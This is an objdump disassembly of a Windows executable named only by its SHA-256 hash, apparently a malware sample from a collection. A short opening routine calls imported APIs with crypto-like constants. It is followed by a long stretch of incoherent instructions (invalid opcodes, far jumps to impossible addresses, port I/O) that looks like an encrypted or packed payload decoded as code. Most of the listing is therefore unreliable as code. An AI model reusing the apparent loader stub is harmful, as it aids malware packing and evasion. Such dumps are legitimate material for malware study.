
6def4cbe326a357616137ff280d6687491579c63a4944a6f4b861c54e48749f7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	inc    esi
  40116f:	mov    ebp,0x2ebd0031
  401174:	es cdq 
  401176:	sbb    dh,0x3a
  401179:	icebp  
  40117a:	pusha  
  40117b:	rcr    DWORD PTR [ecx],cl
  40117d:	fsubr  QWORD PTR [ecx]
  40117f:	repz jb 0x4011d8
  401182:	(bad)  
  401183:	adc    bl,BYTE PTR [esi]
  401185:	jmp    0x4a30744f
  40118a:	pusha  
  40118b:	aaa    
  40118c:	pop    edx
  40118d:	jne    0x40115e
  40118f:	data16 mov ch,BYTE PTR [ebx+0x4c]
  401193:	mov    esp,0x109b5d62
  401198:	jle    0x401129
  40119a:	jmp    0x56d1:0x91acab7d
  4011a1:	dec    ebx
  4011a2:	(bad)  
  4011a3:	lods   al,BYTE PTR ds:[esi]
  4011a4:	popf   
  4011a5:	push   eax
  4011a6:	push   esp
  4011a7:	out    dx,al
  4011a8:	mov    al,0xd4
  4011aa:	adc    ecx,DWORD PTR [ebx]
  4011ac:	xor    esi,eax
  4011ae:	sub    al,0x5b
  4011b0:	repnz or DWORD PTR [edi],eax
  4011b3:	iret   
  4011b4:	mov    dl,0xe3
  4011b6:	int    0xcf
  4011b8:	push   ds
  4011b9:	xchg   ebp,eax
  4011ba:	popf   
  4011bb:	pop    es
  4011bc:	push   ds
  4011bd:	xchg   ebx,eax
  4011be:	jmp    0xf4b693d9
  4011c3:	in     eax,0xc8
  4011c5:	sub    DWORD PTR [eax+0x6f1552fb],ebp
  4011cb:	inc    ebx
  4011cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011cd:	pop    ebx
  4011ce:	retf   
  4011cf:	ja     0x40124a
  4011d1:	(bad)
  4011d4:	sub    eax,0xff630661
  4011d9:	adc    edi,ecx
  4011db:	mov    edx,0xea56aef4
  4011e0:	into   
  4011e1:	in     al,0x3e
  4011e3:	out    0xd1,al
  4011e5:	mov    esp,0x47c504b1
  4011ea:	ficom  WORD PTR [ebx-0x1eef5bfd]
  4011f0:	mov    ds:0x656fd91d,al
  4011f5:	or     cl,BYTE PTR [ecx-0x4906f989]
  4011fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011fc:	rol    DWORD PTR [esi-0x5],1
  4011ff:	jmp    0x401280
  401201:	jge    0x4011ff
  401203:	ret    0x987a
  401206:	cli    
  401207:	push   esp
  401209:	ja     0x4011cc
  40120b:	dec    ecx
  40120c:	push   edx
  40120d:	in     al,dx
  40120e:	cmp    esi,DWORD PTR [esi+0x59]
  401211:	in     al,0x5e
  401213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401214:	pop    ebp
  401215:	ret    
  401216:	lods   al,BYTE PTR ds:[esi]
  401217:	cmp    BYTE PTR [ebx+0x69],0x14
  40121b:	inc    edi
  40121c:	sbb    eax,0x98e32990
  401221:	xchg   ecx,eax
  401222:	inc    ebx
  401223:	mov    ds:0xf4af75a6,eax
  401228:	fsub   DWORD PTR [eax]
  40122a:	lahf   
  40122b:	imul   eax,DWORD PTR [edx-0x4],0x15
  40122f:	push   es
  401230:	push   ebp
  401231:	sar    BYTE PTR [edx+0x30],0xcb
  401235:	dec    DWORD PTR [esp+eax*2]
  401238:	repz es gs test al,0x98
  40123d:	jne    0x4011d8
  40123f:	and    dl,BYTE PTR [esi-0x7d]
  401242:	and    eax,0x1096c806
  401247:	call   0xaf7e:0x62442b7e
  40124e:	mov    ah,0xff
  401250:	or     ebp,DWORD PTR [eax+0x784a3c1f]
  401256:	xchg   esp,eax
  401257:	cmp    al,0x32
  401259:	jl     0x401204
  40125b:	mov    ebx,0xf6362cda
  401260:	mov    esi,0x7b7b42a9
  401265:	mov    BYTE PTR [ecx+ebx*4],dl
  401268:	jae    0x4012aa
  40126a:	mov    ebp,0x42f1e557
  40126f:	and    al,0x92
  401271:	mov    ebp,0xf5e3272d
  401276:	dec    ebx
  401277:	mov    ds:0xdd5c8a06,al
  40127c:	jns    0x401250
  40127e:	push   edx
  40127f:	in     eax,dx
  401280:	mov    ch,0x4d
  401282:	push   ds
  401283:	sahf   
  401284:	xchg   ebp,eax
  401285:	ds dec eax
  401287:	and    al,0x46
  401289:	mov    ecx,0xa06d1e49
  40128e:	data16 sti 
  401290:	mov    bh,0x2f
  401292:	test   DWORD PTR [edi+0x77e4239a],edi
  401298:	js     0x40122b
  40129a:	test   DWORD PTR [esp+ebp*8-0x70d52272],esp
  4012a1:	sub    al,BYTE PTR [ebx-0x303b2f69]
  4012a7:	ss ret 0x6087
  4012ab:	jecxz  0x40130a
  4012ad:	les    ebx,FWORD PTR [edi+0x66]
  4012b0:	repz mov al,0xc4
  4012b3:	adc    BYTE PTR [edx-0x6d],0x38
  4012b7:	int3   
  4012b8:	cmp    eax,esp
  4012ba:	(bad)  
  4012bc:	pop    ecx
  4012bd:	dec    edi
  4012be:	mov    dh,0x8
  4012c0:	int3   
  4012c1:	test   DWORD PTR [ebx-0x3a],ebp
  4012c4:	iret   
  4012c5:	out    0xca,eax
  4012c7:	sbb    DWORD PTR [eax-0x75],0x4513dd2f
  4012ce:	ins    BYTE PTR es:[edi],dx
  4012cf:	jne    0x401282
  4012d1:	aam    0x6
  4012d3:	dec    esp
  4012d4:	sti    
  4012d5:	enter  0xccba,0xcb
  4012d9:	loopne 0x401289
  4012db:	rcl    BYTE PTR [eax+ecx*8],cl
  4012de:	into   
  4012df:	or     BYTE PTR [edx],ch
  4012e1:	jne    0x401287
  4012e3:	jo     0x401289
  4012e5:	ret    0x1f17
  4012e8:	mov    ebp,0xb351d47f
  4012ed:	mov    bl,0x53
  4012ef:	add    al,0x46
  4012f1:	lods   al,BYTE PTR ds:[esi]
  4012f2:	in     eax,0x18
  4012f4:	ror    al,1
  4012f6:	dec    edx
  4012f7:	mov    dh,0x9e
  4012f9:	stos   DWORD PTR es:[edi],eax
  4012fa:	push   ds
  4012fb:	arpl   WORD PTR [edi-0x72],ax
  4012fe:	out    0x22,al
  401300:	inc    esi
  401301:	loope  0x401344
  401303:	mov    bh,0xa
  401305:	inc    esp
  401306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401307:	outs   dx,BYTE PTR ds:[esi]
  401308:	imul   eax,ecx,0x8da05729
  40130e:	mov    edi,0x28180d44
  401313:	and    al,0xe4
  401315:	gs ja  0x401351
  401318:	and    esp,DWORD PTR [ebp+ebx*2-0x4f0c5a6f]
  40131f:	bound  edx,QWORD PTR ds:0xf8a108b2
  401325:	push   ss
  401326:	mov    ds:0xd0a49b43,eax
  40132b:	ja     0x4012da
  40132d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40132e:	pcmpgtd mm2,QWORD PTR [edi]
  401331:	mov    ebx,0xfb9e165f
  401336:	cmc    
  401337:	enter  0xce9e,0xbe
  40133b:	xor    eax,0x6afa9505
  401340:	stos   DWORD PTR es:[edi],eax
  401341:	icebp  
  401342:	mov    bh,0x93
  401344:	(bad)  
  401345:	dec    esp
  401346:	dec    eax
  401347:	pop    es
  401348:	bound  esp,QWORD PTR [ebx+0x64]
  40134b:	jmp    0x4013bb
  40134d:	and    eax,0x595d8009
  401352:	pusha  
  401353:	inc    edi
  401354:	aas    
  401355:	mov    bh,0x95
  401357:	pop    ebp
  401358:	icebp  
  401359:	inc    ebx
  40135a:	pop    ecx
  40135b:	sbb    DWORD PTR [ebx+edx*8-0x5ff4f723],edi
  401362:	and    DWORD PTR [esi],esi
  401364:	mov    DWORD PTR ds:0x7a47cd56,esp
  40136a:	push   ebp
  40136b:	out    dx,al
  40136c:	push   cs
  40136d:	enter  0xb5b2,0xfd
  401371:	mov    WORD PTR [edi+0x5a125581],gs
  401377:	jnp    0x401321
  401379:	mov    ch,0xa0
  40137b:	add    al,0x8
  40137d:	ja     0x401308
  40137f:	and    edi,eax
  401381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401382:	sub    eax,0x58c109a4
  401387:	sbb    DWORD PTR [ecx+0x7],ecx
  40138a:	sbb    DWORD PTR ss:[edx+0x37],ebx
  40138e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40138f:	cs jle 0x4013ce
  401392:	loopne 0x4013aa
  401394:	xchg   edx,eax
  401395:	or     ecx,DWORD PTR [edi]
  401397:	mov    ebx,0x250dc8d8
  40139c:	fstp   TBYTE PTR [edi+0x2a03949d]
  4013a2:	cmp    ebp,DWORD PTR [ebp+0x1e8d518c]
  4013a8:	dec    ecx
  4013a9:	or     BYTE PTR [esi],al
  4013ab:	xor    DWORD PTR [eax+0x12ae15f1],edx
  4013b1:	fdiv   DWORD PTR [ecx+0x12]
  4013b4:	ror    BYTE PTR [ecx],0x95
  4013b7:	ins    BYTE PTR es:[edi],dx
  4013b8:	(bad)  
  4013b9:	out    dx,al
  4013ba:	outs   dx,DWORD PTR ds:[esi]
  4013bb:	aas    
  4013bc:	sub    al,0x2d
  4013be:	adc    al,0xa6
  4013c0:	fldcw  WORD PTR [ebp+0x118969ad]
  4013c6:	std    
  4013c7:	mov    bl,0x52
  4013c9:	(bad)  
  4013ca:	in     eax,0x28
  4013cc:	cwde   
  4013cd:	add    DWORD PTR [eax+0x74e98b65],eax
  4013d3:	jno    0x4013b7
  4013d5:	inc    ecx
  4013d6:	int3   
  4013d7:	lds    eax,FWORD PTR [edx+ebx*4-0x40]
  4013db:	je     0x401377
  4013dd:	pop    es
  4013de:	xor    cl,bh
  4013e0:	mov    DWORD PTR [ebx+ebp*1-0x49d29b35],0x4fcc6bd9
  4013eb:	mov    ch,0x8f
  4013ed:	leave  
  4013ee:	nop
  4013ef:	loope  0x401452
  4013f1:	mov    edx,DWORD PTR [edi-0x137722ce]
  4013f7:	push   esi
  4013f8:	test   al,dl
  4013fa:	and    edx,DWORD PTR [esi+0x4a]
  4013fd:	mov    cs,WORD PTR [ecx-0xc]
  401400:	sar    DWORD PTR [ebx],1
  401402:	fiadd  DWORD PTR [edx+0x34a8717b]
  401408:	loop   0x401435
  40140a:	pop    edi
  40140b:	mov    cl,BYTE PTR [eax-0x65]
  40140e:	cli    
  40140f:	dec    ebx
  401410:	scas   eax,DWORD PTR es:[edi]
  401411:	adc    BYTE PTR [esi-0x6f],0xcb
  401415:	or     bh,BYTE PTR [edi+0x4e614033]
  40141b:	push   edi
  40141c:	retf   0x6edc
  40141f:	cmc    
  401420:	and    al,0xea
  401422:	bound  edi,QWORD PTR [edx]
  401424:	sub    BYTE PTR [eax+0x19],bh
  401427:	icebp  
  401428:	das    
  401429:	cld    
  40142a:	out    dx,eax
  40142b:	repz rcl ecx,1
  40142e:	aas    
  40142f:	ja     0x40140b
  401431:	pop    ecx
  401432:	jp     0x4013b4
  401434:	aas    
  401435:	iret   
  401436:	xor    bh,bh
  401438:	add    esp,ebp
  40143a:	mov    ch,dl
  40143c:	daa    
  40143d:	pop    ss
  40143e:	jo     0x401465
  401440:	mov    bh,0x6f
  401442:	pop    ebx
  401443:	mov    bl,0x7a
  401445:	add    edx,DWORD PTR [ecx-0x28891a39]
  40144b:	jle    0x401428
  40144d:	xor    ecx,DWORD PTR [esp]
  401450:	dec    ebp
  401451:	lds    edx,FWORD PTR [ebp-0x2aad4b4]
  401457:	mov    bh,0xf6
  401459:	frstor [edx]
  40145b:	jns    0x401450
  40145d:	mov    ds:0x57d6026a,al
  401462:	inc    edx
  401464:	into   
  401465:	mov    DWORD PTR [ecx+eiz*4-0x4e],esp
  401469:	iret   
  40146a:	repz in al,0x97
  40146d:	lods   al,BYTE PTR ds:[esi]
  40146e:	xchg   ecx,eax
  40146f:	cmp    DWORD PTR ds:0x7c065397,edi
  401475:	outs   dx,BYTE PTR ds:[esi]
  401476:	enter  0x1790,0x54
  40147a:	pop    es
  40147b:	gs jae 0x4014c1
  40147e:	rcl    BYTE PTR [edx+0x35],0x9f
  401482:	xlat   BYTE PTR ds:[ebx]
  401483:	jge    0x40143a
  401485:	in     eax,dx
  401486:	dec    eax
  401487:	mov    ?,edx
  401489:	fistp  QWORD PTR [eax+0x6d]
  40148c:	xchg   ebp,eax
  40148d:	jp     0x401426
  40148f:	call   0x100c:0xded145b6
  401496:	loopne 0x40150b
  401498:	jbe    0x4014ca
  40149a:	xchg   ebp,eax
  40149b:	pop    eax
  40149c:	in     eax,0x54
  40149e:	cmp    esi,DWORD PTR cs:[edx]
  4014a1:	ins    BYTE PTR es:[edi],dx
  4014a2:	xchg   ecx,eax
  4014a3:	(bad)  
  4014a4:	xchg   ebx,eax
  4014a5:	enter  0xc8d5,0xe4
  4014a9:	xor    al,0x2
  4014ab:	lods   eax,DWORD PTR ds:[esi]
  4014ad:	daa    
  4014ae:	cmp    BYTE PTR [esi+ebp*2-0x3a229a3c],ch
  4014b5:	adc    BYTE PTR [ecx],ah
  4014b7:	int3   
  4014b8:	or     esi,ecx
  4014ba:	retf   0x5acd
  4014bd:	ror    BYTE PTR [esi+0x1c4f04cc],cl
  4014c3:	inc    ebx
  4014c4:	aas    
  4014c5:	push   ds
  4014c6:	test   eax,0x1a9129ff
  4014cb:	aaa    
  4014cc:	pop    ds
  4014cd:	adc    BYTE PTR [eax+0x708fa35e],ch
  4014d3:	adc    BYTE PTR [ebp+ebp*1+0x3eabefe],0x12
  4014db:	pop    ds
  4014dc:	inc    esi
  4014dd:	xor    BYTE PTR [esi-0x7b535150],bl
  4014e3:	jo     0x40147e
  4014e5:	push   eax
  4014e6:	repz dec eax
  4014e8:	xchg   ebx,eax
  4014e9:	mov    bh,0xe1
  4014eb:	mov    bh,0xf4
  4014ed:	cmp    al,0x8a
  4014ef:	sbb    BYTE PTR [esi+0x23],al
  4014f2:	in     eax,dx
  4014f3:	dec    BYTE PTR [eax+0x60]
  4014f6:	ins    DWORD PTR es:[edi],dx
  4014f7:	cmc    
  4014f8:	jp     0x4014bd
  4014fa:	out    dx,al
  4014fb:	cmp    DWORD PTR [esi],ebx
  4014fd:	or     ah,BYTE PTR [ecx+0x1a]
  401500:	mov    ds:0xce034568,eax
  401505:	pop    ebp
  401506:	xor    DWORD PTR [eax],edi
  401508:	pop    ds
  401509:	imul   edi,DWORD PTR [edx-0x7e595e32],0x4f
  401510:	retf   0xf8d5
  401513:	retf   0x6b65
  401516:	std    
  401517:	mov    ebp,0x60d999f6
  40151c:	cmp    ch,ch
  40151e:	add    al,0xa3
  401520:	xlat   BYTE PTR ds:[ebx]
  401521:	jmp    0xe2b2:0x70248427
  401528:	mov    eax,0x14a0f4d
  40152d:	xor    al,0x2f
  40152f:	inc    esp
  401530:	jg     0x4015a4
  401532:	push   esp
  401533:	jg     0x40155f
  401535:	fnsave [ebx+ebp*8+0xf015291]
  40153c:	pop    esp
  40153d:	mov    al,0xc
  40153f:	and    al,0x1f
  401541:	pop    es
  401542:	sar    dh,cl
  401544:	cmc    
  401545:	cmp    al,0x97
  401547:	mov    DWORD PTR [edi],edx
  401549:	jbe    0x4015c8
  40154b:	mov    esi,0xd053fdc1
  401550:	into   
  401551:	daa    
  401552:	(bad)  
  401553:	mov    eax,0xd6d69b6b
  401558:	sbb    bh,BYTE PTR [eax]
  40155a:	pusha  
  40155b:	mov    ds:0x6742d8b6,eax
  401560:	adc    ch,BYTE PTR ds:0xd764fe87
  401566:	xor    cl,ah
  401568:	and    BYTE PTR [edx+0x1cac4ecd],0x92
  40156f:	add    DWORD PTR [ecx],edx
  401571:	inc    esi
  401572:	aad    0xa0
  401574:	mov    bh,0xff
  401576:	outs   dx,DWORD PTR ds:[esi]
  401577:	pusha  
  401578:	and    cl,BYTE PTR [esi]
  40157a:	sbb    ah,BYTE PTR [eiz*8+0x424c4fcd]
  401581:	cmp    DWORD PTR [edx-0x17],edx
  401584:	mov    ch,0x80
  401586:	jns    0x40159e
  401588:	jp     0x401567
  40158a:	sbb    al,al
  40158c:	add    DWORD PTR [ebp+0x50dea8ec],0xd0cfcf8b
  401596:	jmp    0x6ddad8c5
  40159b:	mov    ah,0x60
  40159d:	push   ebx
  40159e:	add    ecx,esp
  4015a0:	and    BYTE PTR [ebx],cl
  4015a2:	jmp    0x401572
  4015a4:	sub    al,BYTE PTR [ecx]
  4015a6:	jecxz  0x401622
  4015a8:	sbb    cl,cl
  4015aa:	push   0x34
  4015ac:	sti    
  4015ad:	test   al,0xbc
  4015af:	dec    edi
  4015b0:	inc    ecx
  4015b1:	dec    esi
  4015b2:	jmp    DWORD PTR [esi-0xf]
  4015b5:	repz push esi
  4015b7:	sub    BYTE PTR [eax],ah
  4015b9:	je     0x4015a9
  4015bb:	jecxz  0x4015fe
  4015bd:	mov    edi,?
  4015bf:	aad    0x3b
  4015c1:	xchg   DWORD PTR [edx],edi
  4015c3:	test   al,0x57
  4015c5:	jb     0x4015d4
  4015c7:	jmp    0x4015a9
  4015c9:	scas   al,BYTE PTR es:[edi]
  4015ca:	ja     0x401634
  4015cc:	mov    bh,0xcd
  4015ce:	cld    
  4015cf:	aas    
  4015d0:	adc    BYTE PTR [ebp-0x3944f686],dl
  4015d6:	aas    
  4015d7:	add    cl,cl
  4015d9:	popa   
  4015da:	xor    DWORD PTR [edi],eax
  4015dc:	or     BYTE PTR [esi-0x54],bl
  4015df:	push   ecx
  4015e0:	cld    
  4015e1:	or     al,0x13
  4015e3:	cwde   
  4015e4:	xor    ecx,DWORD PTR [edi+0x47]
  4015e7:	xor    BYTE PTR [ecx+0x28],dh
  4015ea:	fs add eax,0x9e412d4a
  4015f0:	add    ebx,DWORD PTR [edx+0x59e8b35c]
  4015f6:	bound  ebx,QWORD PTR [ebp-0x6a3b5e33]
  4015fc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015fe:	mov    al,ds:0x84fb35a3
  401603:	jbe    0x4015d7
  401605:	loop   0x401645
  401607:	in     al,dx
  401608:	sub    bh,cl
  40160a:	test   BYTE PTR [edx-0x79c0d098],al
  401610:	push   edi
  401611:	retf   
  401612:	xor    esp,ebp
  401614:	nop
  401615:	xor    dh,bl
  401617:	mov    cs,WORD PTR [ecx]
  401619:	call   0x1f38:0x88e02a25
  401620:	sbb    al,0xe6
  401623:	or     esi,DWORD PTR [ebx-0x25]
  401626:	cwde   
  401627:	mov    bh,0xdb
  401629:	ss retw 
  40162c:	dec    esp
  40162d:	loop   0x401627
  40162f:	out    0x36,eax
  401631:	dec    ebp
  401632:	setge  BYTE PTR [ebp+0x64573174]
  401639:	shl    bh,0xef
  40163c:	pop    esp
  40163d:	icebp  
  40163e:	pop    edi
  40163f:	jmp    0xb909f6d1
  401644:	jl     0x4015f2
  401646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401647:	jecxz  0x401659
  401649:	test   al,cl
  40164b:	in     eax,0x52
  40164d:	cwde   
  40164e:	add    DWORD PTR [ecx-0x7a],esi
  401651:	and    DWORD PTR [esi+0x3c],esp
  401654:	and    al,BYTE PTR [esi+0x42999f28]
  40165a:	fild   QWORD PTR [ecx+0x1bb4fabd]
  401660:	xor    al,0x7
  401662:	iret   
  401663:	lock icebp 
  401665:	mov    ss,edx
  401667:	shl    BYTE PTR [ebp+0x3],cl
  40166a:	mov    ebp,0xb729a1a
  40166f:	dec    ecx
  401670:	pop    es
  401671:	adc    ebp,DWORD PTR [ecx-0x22]
  401674:	pop    edi
  401675:	out    dx,al
  401676:	jae    0x401612
  401678:	dec    esi
  401679:	mov    al,0x5a
  40167b:	inc    ebx
  40167c:	pop    esp
  40167d:	push   ds
  40167e:	jge    0x4016e7
  401680:	push   cs
  401681:	das    
  401682:	or     DWORD PTR [ebp-0x6b8ef87b],edx
  401688:	and    al,0x36
  40168a:	addr16 dec edi
  40168c:	std    
  40168d:	mov    eax,ds:0xe49f77a4
  401692:	and    edx,ecx
  401694:	cmc    
  401695:	jae    0x4016cf
  401697:	mov    ?,WORD PTR ds:0xd2ee11a5
  40169d:	sub    esp,ebp
  40169f:	sbb    DWORD PTR [esi],ecx
  4016a1:	inc    esp
  4016a2:	in     eax,0x4
  4016a4:	dec    edi
  4016a5:	mov    bh,0xc0
  4016a7:	sub    dh,dl
  4016a9:	out    0x1f,al
  4016ab:	or     eax,0x24b47f61
  4016b0:	outs   dx,BYTE PTR ds:[esi]
  4016b1:	mov    al,BYTE PTR [ecx+0x7760713c]
  4016b7:	xchg   ebp,eax
  4016b8:	xchg   edx,eax
  4016b9:	neg    DWORD PTR [edi+0x35]
  4016bc:	mov    ds:0x5ad04466,eax
  4016c1:	and    cl,cl
  4016c3:	(bad)  
  4016c4:	adc    dl,BYTE PTR [eax+edx*8]
  4016c7:	mov    ah,0x96
  4016c9:	push   edx
  4016ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016cb:	inc    edi
  4016cc:	loopne 0x40172e
  4016ce:	cmp    al,0x52
  4016d0:	in     eax,dx
  4016d1:	cmp    ecx,ebp
  4016d3:	ror    DWORD PTR [ecx-0x4d],0xe
  4016d7:	push   edi
  4016d8:	mov    ds:0x1b79b8c4,al
  4016dd:	nop
  4016de:	add    BYTE PTR [eax],ah
  4016e0:	pop    ebx
  4016e1:	aad    0x6d
  4016e3:	inc    esi
  4016e4:	mov    dh,0xe1
  4016e6:	add    eax,0x1c59e2b2
  4016eb:	mov    eax,ds:0xc8feab0b
  4016f0:	addr16 xchg esp,eax
  4016f2:	fs push edx
  4016f4:	repnz mov edx,0xa177dac7
  4016fa:	mov    eax,ds:0x8a7bf0d
  4016ff:	dec    ecx
  401700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401701:	loope  0x401745
  401703:	sbb    al,0x15
  401705:	lods   eax,DWORD PTR ds:[esi]
  401706:	mov    bl,0x99
  401708:	fs jle 0x40172b
  40170b:	call   0x5e75c59d
  401710:	jns    0x4016aa
  401712:	retf   0xc82b
  401715:	addr16 test al,0xa4
  401718:	in     eax,dx
  401719:	add    DWORD PTR [esi-0x70],eax
  40171c:	cdq    
  40171d:	ins    DWORD PTR es:[edi],dx
  40171e:	iret   
  40171f:	(bad)  
  401720:	mov    al,0xa1
  401722:	das    
  401723:	fs repz dec ebp
  401726:	mov    DWORD PTR [esi],0xbdc9689
  40172c:	(bad)  
  40172e:	scas   al,BYTE PTR es:[edi]
  40172f:	fwait
  401730:	adc    DWORD PTR [edi],ebx
  401732:	push   ebx
  401733:	inc    ebp
  401734:	mov    cl,0xa3
  401736:	sbb    ah,BYTE PTR [edi+0x5eba4c04]
  40173c:	mov    ebp,0xc35c1f6c
  401741:	jo     0x4016e8
  401743:	push   es
  401744:	push   edi
  401745:	jbe    0x40174e
  401747:	xchg   edx,eax
  401748:	leave  
  401749:	call   0x72ebc271
  40174e:	sub    DWORD PTR [esi],edi
  401750:	fwait
  401751:	pcmpgtw mm0,QWORD PTR [edi-0x78cd19a1]
  401758:	jg     0x401753
  40175a:	pushf  
  40175b:	es xchg ebp,eax
  40175d:	lea    si,[edi+0x11]
  401761:	jnp    0x40177c
  401763:	call   0x77e5:0xd9a8195c
  40176a:	imul   esi,edx,0x49
  40176d:	js     0x4016f2
  40176f:	enter  0x7a15,0xd8
  401773:	pusha  
  401774:	je     0x4017f0
  401776:	in     eax,dx
  401777:	pop    edx
  401778:	cmp    ah,BYTE PTR [edi-0x66643081]
  40177e:	bnd call 0xa925411
  401784:	cdq    
  401785:	int3   
  401786:	or     BYTE PTR [edi+ecx*1+0x3d],al
  40178a:	outs   dx,BYTE PTR ds:[esi]
  40178b:	mul    dl
  40178d:	push   0xecd91675
  401792:	pop    eax
  401793:	inc    edi
  401794:	push   ebx
  401795:	shr    BYTE PTR [edi+0x4a],0x1b
  401799:	stos   DWORD PTR es:[edi],eax
  40179a:	jno    0x401802
  40179c:	lea    edx,[eax]
  40179e:	push   edx
  40179f:	jmp    0x4017e5
  4017a1:	or     dh,al
  4017a3:	jmp    0x40175c
  4017a5:	retf   0x7ab7
  4017a8:	and    ah,BYTE PTR [edi+0x12]
  4017ab:	into   
  4017ac:	bound  ebp,QWORD PTR [edx+0xf65da3b]
  4017b2:	cmp    al,0xcb
  4017b4:	int    0xaf
  4017b6:	inc    edi
  4017b7:	mov    esi,0xc210c31a
  4017bc:	xor    BYTE PTR [edx],bl
  4017be:	ins    BYTE PTR es:[edi],dx
  4017bf:	mov    ds:0xb3981fbd,eax
  4017c4:	popa   
  4017c5:	rol    al,cl
  4017c7:	in     eax,dx
  4017c8:	inc    ebp
  4017c9:	push   esi
  4017ca:	lods   eax,DWORD PTR ds:[esi]
  4017cb:	or     al,0xd1
  4017cd:	xchg   edx,eax
  4017ce:	inc    ebp
  4017cf:	add    eax,0xfd205697
  4017d4:	xor    al,0x47
  4017d6:	ins    DWORD PTR es:[edi],dx
  4017d7:	xchg   esi,eax
  4017d8:	mov    ebp,0x8e07446e
  4017dd:	ja     0x40180a
  4017df:	jns    0x401823
  4017e1:	mov    ah,0x4a
  4017e3:	aad    0xc2
  4017e5:	popa   
  4017e6:	and    BYTE PTR [ebx+eiz*2+0x844493b],dh
  4017ed:	test   al,0x20
  4017ef:	(bad)  
  4017f0:	lock or eax,0x8a382426
  4017f6:	pop    ss
  4017f7:	and    BYTE PTR [edx+0x3],ah
  4017fa:	jp     0x40184b
  4017fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017fd:	test   al,0x21
  4017ff:	mov    ch,0x43
  401801:	push   cs
  401802:	lea    esp,ds:0x88db6643
  401808:	aad    0x7e
  40180a:	add    ebx,DWORD PTR [ebx+0x0]
  40180d:	and    al,BYTE PTR ds:0x5b908ecd
  401813:	fcomp  QWORD PTR [esi-0x740385fe]
  401819:	xor    al,0x5e
  40181b:	gs std 
  40181d:	sbb    DWORD PTR [ebx+ebp*4-0x67695046],0xd705e3f7
  401828:	cmc    
  401829:	aad    0x1e
